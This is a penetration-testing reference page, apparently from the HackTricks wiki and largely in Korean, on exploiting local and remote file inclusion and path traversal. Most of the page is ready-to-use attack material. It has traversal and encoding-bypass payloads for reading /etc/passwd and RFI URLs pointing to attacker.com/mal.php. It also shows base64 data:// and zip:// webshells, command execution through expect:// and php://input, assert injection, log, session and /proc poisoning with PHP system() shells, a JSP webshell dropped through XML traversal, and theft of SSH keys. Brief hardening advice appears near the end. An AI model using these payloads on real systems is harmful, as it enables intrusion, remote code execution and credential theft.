# File Inclusion/Path traversal

{{#include ../../banners/hacktricks-training.md}}

## File Inclusion

**Remote File Inclusion (RFI):** 원격 서버에서 파일을 로드합니다 (최고: 코드를 작성하면 서버가 이를 실행합니다). php에서는 기본적으로 이 기능이 **비활성화**되어 있습니다 (**allow_url_include**).\
**Local File Inclusion (LFI):** 서버가 로컬 파일을 로드합니다.

The vulnerability occurs when the user can control in some way the file that is going to be load by the server.

취약한 **PHP functions**: require, require_once, include, include_once

이 취약점을 익스플로잇하는 데 유용한 도구: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## 블라인드 - 흥미로운 - LFI2RCE 파일들
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**여러 \*nix LFI 리스트를 혼합하고 경로를 추가해 만든 목록:**


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt
{{#endref}}

또한 `/`을 `\`로 바꿔보세요  
또한 `../../../../../`를 추가해 보세요

취약점 존재 여부를 확인하기 위해 /etc/password 파일을 찾는 여러 기법을 사용하는 목록은 [here](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)에 있습니다

### **Windows**

여러 wordlists의 병합:


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt
{{#endref}}

또한 `/`을 `\`로 바꿔보세요  
또한 `C:/`를 제거하고 `../../../../../`를 추가해 보세요

취약점 존재 여부를 확인하기 위해 /boot.ini 파일을 찾는 여러 기법을 사용하는 목록은 [here](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt)에 있습니다

### **OS X**

Linux의 LFI 리스트를 확인하세요.

## Basic LFI and bypasses

모든 예시는 Local File Inclusion에 대한 것이지만 Remote File Inclusion에도 적용될 수 있습니다 (page=[http://myserver.com/phpshellcode.txt\\](<http://myserver.com/phpshellcode.txt)//>).
```
http://example.com/index.php?page=../../../etc/passwd
```
### traversal sequences 비재귀적으로 제거됨
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Null byte (%00)**

제공된 문자열 끝에 더 많은 문자가 추가되는 것을 우회 (우회 대상: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
이 문제는 **PHP 5.4 이후에 해결되었습니다**

### **인코딩**

double URL encode (및 기타)와 같은 비표준 인코딩을 사용할 수 있습니다:
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### 존재하는 폴더에서

아마도 백엔드가 폴더 경로를 검사하고 있을 수 있습니다:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### 서버에서 파일 시스템 디렉터리 탐색

서버의 파일 시스템은 특정 기법을 사용해 파일뿐 아니라 디렉터리도 재귀적으로 탐색할 수 있습니다. 이 과정은 디렉터리 깊이를 확인하고 특정 폴더의 존재를 탐침하는 것을 포함합니다. 아래는 이를 달성하기 위한 자세한 방법입니다:

1. **디렉터리 깊이 확인:** 현재 디렉터리의 깊이는 `/etc/passwd` 파일을 성공적으로 가져오는 것으로 확인합니다(서버가 Linux 기반인 경우 적용 가능). 예시 URL은 다음과 같이 구성될 수 있으며, 이는 깊이가 3임을 나타냅니다:
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **폴더 탐색 시도:** URL에 의심되는 폴더 이름(예: `private`)을 추가한 다음, `/etc/passwd`로 돌아가세요. 추가된 디렉터리 레벨 때문에 depth를 하나 증가시켜야 합니다:
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **결과 해석:** 서버의 응답은 해당 폴더의 존재 여부를 알려줍니다:
- **오류 / 출력 없음:** 지정된 위치에 `private` 폴더가 없을 가능성이 높습니다.
- **`/etc/passwd`의 내용:** `private` 폴더의 존재가 확인됩니다.
4. **재귀적 탐색:** 발견한 폴더는 동일한 기법이나 전통적인 Local File Inclusion (LFI) 방법으로 하위 디렉토리나 파일을 추가로 조사할 수 있습니다.

파일 시스템의 다른 위치에 있는 디렉토리를 탐색하려면 payload를 적절히 조정하세요. 예를 들어, 현재 디렉토리가 깊이 3에 있다고 가정할 때 `/var/www/`에 `private` 디렉토리가 있는지 확인하려면 다음을 사용하세요:
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **Path Truncation Technique**

Path truncation은 웹 애플리케이션에서 파일 경로를 조작하기 위해 사용되는 기법이다. 이 방법은 파일 경로 끝에 추가 문자를 붙여 차단하는 일부 보안 조치를 우회해 제한된 파일에 접근하는 데 자주 사용된다. 목표는 보안 조치에 의해 변경된 이후에도 여전히 원하는 파일을 가리키는 파일 경로를 만드는 것이다.

In PHP에서는 파일 시스템의 특성상 파일 경로의 여러 표현이 동등하게 취급될 수 있다. 예를 들어:

- `/etc/passwd`, `/etc//passwd`, `/etc/./passwd`, and `/etc/passwd/`는 모두 같은 경로로 처리된다.
- 마지막 6자가 `passwd`일 때, 끝에 `/`를 추가해 `passwd/`로 만들어도 대상 파일은 변경되지 않는다.
- 마찬가지로, 파일 경로 끝에 `.php`가 붙은 경우(예: `shellcode.php`), 끝에 `/.`를 추가해도 접근하는 파일은 변경되지 않는다.

다음 예제들은 민감한 내용(사용자 계정 정보) 때문에 자주 겨냥되는 `/etc/passwd`에 접근하기 위해 path truncation을 활용하는 방법을 보여준다:
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
이러한 시나리오에서는 필요한 traversals 수가 약 2027개 정도일 수 있지만, 이 수는 서버의 구성에 따라 달라집니다.

- **Using Dot Segments and Additional Characters**: Traversal sequences (`../`)와 추가적인 dot segments 및 문자를 결합하면 파일 시스템을 탐색하는 데 사용될 수 있으며, 서버가 덧붙인 문자열을 효과적으로 무시할 수 있습니다.
- **Determining the Required Number of Traversals**: 시행착오를 통해 루트 디렉토리로 이동한 다음 `/etc/passwd`에 도달하기 위해 필요한 정확한 `../` 시퀀스 수를 찾을 수 있으며, 이때 `.php` 같은 덧붙여진 문자열은 무력화하되 원하는 경로(` /etc/passwd`)는 그대로 유지되도록 합니다.
- **Starting with a Fake Directory**: 경로를 존재하지 않는 디렉토리(예: `a/`)로 시작하는 것은 흔한 관행입니다. 이 기법은 예방 조치로 사용되거나 서버의 경로 파싱 로직 요구사항을 충족시키기 위해 사용됩니다.

path truncation techniques를 사용할 때는 서버의 경로 파싱 동작과 파일시스템 구조를 이해하는 것이 중요합니다. 각 시나리오마다 다른 접근이 필요할 수 있으며, 가장 효과적인 방법을 찾기 위해 테스트가 자주 필요합니다.

**이 취약점은 PHP 5.3에서 수정되었습니다.**

### **Filter bypass tricks**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Remote File Inclusion

php에서는 기본적으로 비활성화되어 있습니다. 이는 **`allow_url_include`**가 **Off**이기 때문입니다. 작동하려면 **On**이어야 하며, 그 경우 서버의 PHP 파일을 include하여 RCE를 얻을 수 있습니다:
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
만약 어떤 이유로 **`allow_url_include`**가 **On**이지만 PHP가 외부 웹페이지 접근을 **filtering**하고 있다면, [according to this post](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/), 예를 들어 data 프로토콜과 base64를 사용해 b64 PHP 코드를 디코드하고 RCE를 얻을 수 있습니다:
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
> [!TIP]
> 이전 코드에서 마지막 `+.txt`는 공격자가 `.txt`로 끝나는 문자열을 필요로 했기 때문에 추가되었으며, 따라서 문자열은 그것으로 끝나고 b64 디코딩 후 해당 부분은 단순히 쓸모없는 데이터를 반환하고 실제 PHP 코드가 포함(따라서 실행)됩니다.

다른 예시로, **`php://` 프로토콜을 사용하지 않는** 경우는 다음과 같습니다:
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
## Python 루트 요소

python에서 다음과 같은 코드의 경우:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
사용자가 **absolute path**를 **`file_name`**에 전달하면, **이전 경로는 단순히 제거됩니다**:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
이는 [the docs](https://docs.python.org/3.10/library/os.path.html#os.path.join)에 따른 의도된 동작입니다:

> 컴포넌트가 절대 경로인 경우, 이전의 모든 컴포넌트는 버려지고 결합은 절대 경로 컴포넌트부터 계속됩니다.

## Java 디렉토리 목록

Java에서 Path Traversal이 있을 경우 파일 대신 디렉토리를 **요청하면**, 디렉토리의 **목록이 반환되는 것 같습니다**. 다른 언어에서는 이런 일이 발생하지 않는 것으로 보입니다(내가 알기로는).

## 상위 25개 매개변수

다음은 local file inclusion (LFI) 취약점에 노출될 수 있는 상위 25개 매개변수 목록입니다 (from [link](https://twitter.com/trbughunters/status/1279768631845494787)):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI — PHP 래퍼 및 프로토콜을 사용한

### php://filter

PHP filters는 데이터가 읽히거나 써지기 전에 기본적인 **데이터 수정 작업**을 수행할 수 있게 해준다. 필터는 5가지 카테고리로 나뉜다:

- [String Filters](https://www.php.net/manual/en/filters.string.php):
- `string.rot13`
- `string.toupper`
- `string.tolower`
- `string.strip_tags`: 데이터에서 태그 제거 ( "<"와 ">" 문자 사이의 모든 것)
- Note that this filter has disappear from the modern versions of PHP
- [Conversion Filters](https://www.php.net/manual/en/filters.convert.php)
- `convert.base64-encode`
- `convert.base64-decode`
- `convert.quoted-printable-encode`
- `convert.quoted-printable-decode`
- `convert.iconv.*` : 다른 인코딩으로 변환(`convert.iconv.<input_enc>.<output_enc>`) . 지원되는 **모든 인코딩 목록**을 얻으려면 콘솔에서 `iconv -l`을 실행하세요.

> [!WARNING]
> Abusing the `convert.iconv.*` conversion filter you can **generate arbitrary text**, which could be useful to write arbitrary text or make a function like include process arbitrary text. For more info check [**LFI2RCE via php filters**](lfi2rce-via-php-filters.md).

- [Compression Filters](https://www.php.net/manual/en/filters.compression.php)
- `zlib.deflate`: 콘텐츠를 압축 (많은 정보를 exfiltrate 할 때 유용)
- `zlib.inflate`: 데이터를 압축 해제
- [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php)
- `mcrypt.*` : 더 이상 사용되지 않음
- `mdecrypt.*` : 더 이상 사용되지 않음
- Other Filters
- php에서 `var_dump(stream_get_filters());`를 실행하면 몇 가지 **예상치 못한 필터**를 찾을 수 있다:
- `consumed`
- `dechunk`: HTTP chunked 인코딩을 역변환
- `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
> [!WARNING]
> The part "php://filter" is case insensitive

### Using php filters as oracle to read arbitrary files

[**In this post**](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle) 은 서버에서 출력이 바로 반환되지 않는 상황에서 로컬 파일을 읽는 기법을 제안합니다. 이 기법은 **php filters를 oracle로 사용한 파일의 boolean exfiltration(문자 단위)** 에 기반합니다. 이는 php filters가 텍스트를 충분히 크게 만들어 php가 예외를 던지게 할 수 있기 때문입니다.

원문 포스트에는 기법에 대한 자세한 설명이 있으니 참고하시고, 여기에는 간단한 요약만 적습니다:

- codec **`UCS-4LE`** 를 사용해 텍스트의 선행 문자를 남기고 문자열의 크기를 기하급수적으로 증가시킵니다.
- 이렇게 하면 초깃값 문자가 정확히 맞았을 때 텍스트가 매우 커져 php가 **error** 를 발생시킵니다.
- **dechunk** filter는 **첫 문자가 hexadecimal이 아니면 모든 것을 제거** 하므로, 첫 문자가 hex인지 알 수 있습니다.
- 이것은 이전 변환들과(및 추측한 문자에 따라 다른 filters) 결합되어, 초기 텍스트의 첫 문자가 변환을 충분히 거쳐 hexadecimal이 아니게 되는 시점을 통해 문자를 추정할 수 있게 해줍니다. 만약 hex라면 dechunk가 삭제하지 않고, 초기 폭발(bomb)이 php error를 유발합니다.
- codec **convert.iconv.UNICODE.CP930** 은 각 문자를 다음 문자로 변환합니다(예: a -> b). 따라서 예를 들어 첫 문자가 `a`인지 알아내려면 이 codec을 6번 적용하면 a->b->c->d->e->f->g 가 되어 더 이상 hexadecimal 문자가 아니게 되고, 결과적으로 dechunk가 삭제하지 않아 초기 bomb으로 php error가 발생하는지로 판단할 수 있습니다.
- 시작에서 **rot13** 같은 다른 변환을 사용하면 n, o, p, q, r 같은 다른 문자들을 leak할 수 있습니다(또한 다른 codecs를 이용해 다른 문자들을 hex 범위로 이동시킬 수 있습니다).
- 초기 문자가 숫자일 경우에는 base64로 인코딩하고 처음 두 글자를 leak하여 숫자를 판별해야 합니다.
- 최종 문제는 **초기 문자보다 더 많은 데이터**를 어떻게 leak할 것인가입니다. convert.iconv.UTF16.UTF-16BE, convert.iconv.UCS-4.UCS-4LE, convert.iconv.UCS-4.UCS-4LE 같은 order memory filters를 사용하면 문자들의 순서를 변경하여 텍스트의 다른 문자를 첫 위치로 가져올 수 있습니다.
- 추가 데이터를 얻기 위해서는 **convert.iconv.UTF16.UTF16** 으로 초반에 2바이트의 잡(junk) 데이터를 생성하고, **UCS-4LE** 를 적용해 **다음 2바이트와 피벗(pivot)** 시키고, 잡 데이터가 나올 때까지 데이터를 삭제해(이렇게 하면 초기 텍스트의 처음 2바이트가 제거됩니다) 원하는 비트에 도달할 때까지 이 과정을 계속합니다.

In the post a tool to perform this automatically was also leaked: [php_filters_chain_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit).

### php://fd

이 wrapper는 프로세스가 연 file descriptors에 접근할 수 있게 해줍니다. 열린 파일의 내용을 exfiltrate하는 데 잠재적으로 유용할 수 있습니다:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
또한 **php://stdin, php://stdout and php://stderr**를 사용하여 각각 **file descriptors 0, 1 and 2**에 접근할 수 있습니다 (공격에서 어떻게 유용할지는 잘 모르겠습니다)

### zip:// and rar://

PHPShell이 포함된 Zip 또는 Rar 파일을 업로드하고 접근하세요.\
rar protocol을 악용하려면 **명시적으로 활성화되어야 합니다**.
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
이 프로토콜은 php 설정 **`allow_url_open`** 및 **`allow_url_include`**에 의해 제한된다는 점에 유의하세요

### expect://

Expect는 활성화되어 있어야 합니다. 다음을 사용하여 코드를 실행할 수 있습니다:
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

POST 매개변수에 payload를 지정하세요:
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

`.phar` 파일은 웹 애플리케이션이 파일 로드를 위해 `include` 같은 함수를 사용할 때 PHP 코드를 실행하는 데 사용할 수 있습니다. 아래의 PHP 코드 스니펫은 `.phar` 파일을 생성하는 방법을 보여줍니다:
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
`.phar` 파일을 컴파일하려면 다음 명령을 실행해야 합니다:
```bash
php --define phar.readonly=0 create_path.php
```
Upon execution, a file named `test.phar` will be created, which could potentially be leveraged to exploit Local File Inclusion (LFI) vulnerabilities.

LFI가 PHP 내부의 코드를 실행하지 않고 단순히 파일을 읽기만 하는 경우(예: `file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()`, `filesize()` 등의 함수로), deserialization 취약점을 이용한 공격을 시도할 수 있습니다. 이 취약점은 `phar` 프로토콜을 통해 파일을 읽을 때 관련됩니다.

For a detailed understanding of exploiting deserialization vulnerabilities in the context of `.phar` files, refer to the document linked below:

[Phar Deserialization Exploitation Guide](phar-deserialization.md)


{{#ref}}
phar-deserialization.md
{{#endref}}

### CVE-2024-2961

It was possible to abuse **any arbitrary file read from PHP that supports php filters** to get a RCE. The detailed description can be [**found in this post**](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)**.**\
Very quick summary: a **3 byte overflow** in the PHP heap was abused to **alter the chain of free chunks** of anspecific size in order to be able to **write anything in any address**, so a hook was added to call **`system`**.\
It was possible to alloc chunks of specific sizes abusing more php filters.

### More protocols

Check more possible[ **protocols to include here**](https://www.php.net/manual/en/wrappers.php)**:**

- [php://memory and php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) — 메모리나 임시 파일에 쓰기 (file inclusion attack에서 어떻게 유용할지 확실하지 않음)
- [file://](https://www.php.net/manual/en/wrappers.file.php) — 로컬 파일시스템 접근
- [http://](https://www.php.net/manual/en/wrappers.http.php) — HTTP(s) URL 접근
- [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) — FTP(s) URL 접근
- [zlib://](https://www.php.net/manual/en/wrappers.compression.php) — Compression Streams
- [glob://](https://www.php.net/manual/en/wrappers.glob.php) — 패턴에 맞는 경로명 찾기 (출력 가능한 내용을 반환하지 않으므로 여기서는 그다지 유용하지 않음)
- [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) — Secure Shell 2
- [ogg://](https://www.php.net/manual/en/wrappers.audio.php) — 오디오 스트림 (임의 파일을 읽는 데에는 유용하지 않음)

## LFI via PHP's 'assert'

Local File Inclusion (LFI)는 문자열 내의 코드를 실행할 수 있는 'assert' 함수를 다룰 때 특히 위험합니다. 입력에 ".." 같은 directory traversal 문자가 포함되어 있는지 검사하지만 제대로 정제되지 않는 경우 문제가 됩니다.

For example, PHP code might be designed to prevent directory traversal like so:
```bash
assert("strpos('$file', '..') === false") or die("");
```
이것은 traversal을 막기 위한 것이지만, 의도치 않게 code injection을 위한 벡터를 만듭니다. 파일 내용을 읽기 위해 이를 악용하려면 공격자는 다음을 사용할 수 있습니다:
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
마찬가지로, 임의의 시스템 명령을 실행하려면 다음을 사용할 수 있다:
```plaintext
' and die(system("id")) or '
```
It's important to **URL-encode these payloads**.

## PHP Blind Path Traversal

> [!WARNING]
> 이 기법은 당신이 **파일 경로**를 **제어**할 수 있는 **PHP 함수**가 파일에 **접근**하지만 파일 내용을 보지 못하는 경우(예: 단순한 **`file()`** 호출)와 관련이 있습니다. 그러나 내용은 표시되지 않습니다.

In [**this incredible post**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) it's explained how a blind path traversal can be abused via PHP filter to **exfiltrate the content of a file via an error oracle**.

요약하면, 이 기법은 **"UCS-4LE" encoding**을 사용해 파일의 내용을 매우 **크게** 만들어 그 파일을 여는 **PHP function**이 **오류**를 발생시키게 합니다.

그 후 첫 문자를 leak하기 위해 필터 **`dechunk`**가 **base64**나 **rot13** 같은 다른 필터들과 함께 사용되고, 마지막으로 필터 **convert.iconv.UCS-4.UCS-4LE** 및 **convert.iconv.UTF16.UTF-16BE**를 사용해 다른 문자들을 시작 부분에 배치하고 그 문자들을 leak합니다.

**취약할 수 있는 함수들**: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (only target read only with this)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

기술적인 세부사항은 앞서 언급한 글을 참고하세요!

## LFI2RCE

### Arbitrary File Write via Path Traversal (Webshell RCE)

서버 측 코드가 파일을 수신/업로드할 때 목적지 경로를 사용자 제어 데이터(예: 파일명이나 URL)를 사용해 canonicalising 및 검증 없이 조립하면, `..` 세그먼트와 절대 경로가 의도한 디렉터리를 벗어나 임의 파일 쓰기를 초래할 수 있습니다. 페이로드를 web-exposed 디렉터리에 배치할 수 있다면, 보통 webshell을 올려 인증 없는 RCE를 얻을 수 있습니다.

Typical exploitation workflow:
- 쓰기 primitive를 제공하는 엔드포인트나 백그라운드 작업을 식별합니다(경로/파일명을 받아 디스크에 내용을 쓰는 곳 — 예: 메시지 기반 수신, XML/JSON 명령 핸들러, ZIP 추출기 등).
- web-exposed 디렉터리를 파악합니다. 일반적인 예:
- Apache/PHP: `/var/www/html/`
- Tomcat/Jetty: `<tomcat>/webapps/ROOT/` → drop `shell.jsp`
- IIS: `C:\inetpub\wwwroot\` → drop `shell.aspx`
- 의도된 저장 디렉터리에서 webroot로 빠져나오도록 traversal 경로를 구성하고, webshell 내용을 포함시킵니다.
- 드롭된 페이로드를 브라우저로 열어 명령을 실행합니다.

Notes:
- 쓰기를 수행하는 취약한 서비스는 비-HTTP 포트에서 리스닝할 수 있습니다(예: TCP 4004의 JMF XML listener). 메인 웹 포털(다른 포트)이 나중에 귀하의 페이로드를 제공할 것입니다.
- Java 스택에서는 이러한 파일 쓰기가 종종 단순한 `File`/`Paths` 문자열 연결로 구현됩니다. 정규화(canonicalisation)/허용 목록(allow-listing) 검증의 부재가 핵심 결함입니다.

Generic XML/JMF-style example (product schemas vary – the DOCTYPE/body wrapper is irrelevant for the traversal):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<JMF SenderID="hacktricks" Version="1.3">
<Command Type="SubmitQueueEntry">
<!-- Write outside the intake folder into the webroot via traversal -->
<Resource Name="FileName">../../../webapps/ROOT/shell.jsp</Resource>
<Data>
<![CDATA[
<%@ page import="java.io.*" %>
<%
String c = request.getParameter("cmd");
if (c != null) {
Process p = Runtime.getRuntime().exec(c);
try (var in = p.getInputStream(); var out = response.getOutputStream()) {
in.transferTo(out);
}
}
%>
]]>
</Data>
</Command>
</JMF>
```
이 클래스의 버그를 막는 하드닝:
- 경로를 정규화하여 canonical path로 만들고, 허용된(allow-listed) 기본 디렉터리의 하위인지 강제하세요.
- `..`, absolute roots, 또는 drive letters를 포함하는 경로는 모두 거부하세요; generated filenames를 선호하세요.
- writer를 권한이 낮은 계정으로 실행하고, 쓰기 디렉터리를 served roots와 분리하세요.

## Remote File Inclusion

앞서 설명했습니다. [**follow this link**](#remote-file-inclusion).

### Apache/Nginx 로그 파일을 통해

If the Apache or Nginx server is **vulnerable to LFI** inside the include function you could try to access to **`/var/log/apache2/access.log` or `/var/log/nginx/access.log`**, set inside the **user agent** or inside a **GET parameter** a php shell like **`<?php system($_GET['c']); ?>`** and include that file

> [!WARNING]
> Note that **if you use double quotes** for the shell instead of **simple quotes**, the double quotes will be modified for the string "_**quote;**_", **PHP will throw an error** there and **nothing else will be executed**.
>
> Also, make sure you **write correctly the payload** or PHP will error every time it tries to load the log file and you won't have a second opportunity.

This could also be done in other logs but **be careful,** the code inside the logs could be URL encoded and this could destroy the Shell. The header **authorisation "basic"** contains "user:password" in Base64 and it is decoded inside the logs. The PHPShell could be inserted inside this header.\  
다른 가능한 로그 경로:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing wordlist: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### 이메일을 통해

**메일 전송**: 내부 계정(user@localhost)으로 PHP payload인 `<?php echo system($_REQUEST["cmd"]); ?>`를 포함한 메일을 보내고, 다음 경로 중 하나로 사용자의 메일을 include 해 보세요: **`/var/mail/<USERNAME>`** 또는 **`/var/spool/mail/<USERNAME>`**

### /proc/\*/fd/\*를 통해

1. 많은 shells를 업로드하세요 (예: 100개)  
2. [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD)를 include 하세요. 여기서 $PID = 프로세스의 PID (can be brute forced), $FD = 파일 디스크립터 (can be brute forced too)

### /proc/self/environ를 통해

로그 파일처럼, User-Agent에 payload를 담아 전송하면 /proc/self/environ 파일에 반영됩니다
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### 업로드를 통해

파일을 업로드할 수 있다면, 그 안에 shell payload를 주입하세요 (예: `<?php system($_GET['c']); ?>` ).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
파일을 읽기 쉽게 유지하려면 이미지/문서/PDF의 메타데이터에 주입하는 것이 가장 좋습니다

### Via Zip fie upload

압축된 PHP shell이 포함된 ZIP 파일을 업로드한 후 접근:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### PHP sessions를 통해

웹사이트가 PHP Session (PHPSESSID)을 사용하는지 확인하세요
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
PHP에서는 이러한 세션이 _/var/lib/php5/sess\\_\[PHPSESSID]\_ 파일에 저장됩니다
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
쿠키를 `<?php system('cat /etc/passwd');?>`로 설정하세요
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
LFI를 사용해 PHP 세션 파일을 포함하세요
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### Via ssh

ssh가 활성화되어 있으면 어떤 사용자가 사용되고 있는지 (/proc/self/status & /etc/passwd) 확인하고 **\<HOME>/.ssh/id_rsa**에 접근해 보세요.

### **Via** **vsftpd** _**logs**_

FTP 서버 vsftpd의 로그는 _**/var/log/vsftpd.log**_에 위치합니다. Local File Inclusion (LFI) 취약점이 존재하고 노출된 vsftpd 서버에 접근할 수 있는 경우, 다음 절차를 고려할 수 있습니다:

1. 로그인 과정에서 username 필드에 PHP 페이로드를 주입합니다.
2. 주입 후 LFI를 이용해 _**/var/log/vsftpd.log**_에서 서버 로그를 가져옵니다.

### Via php base64 filter (using base64)

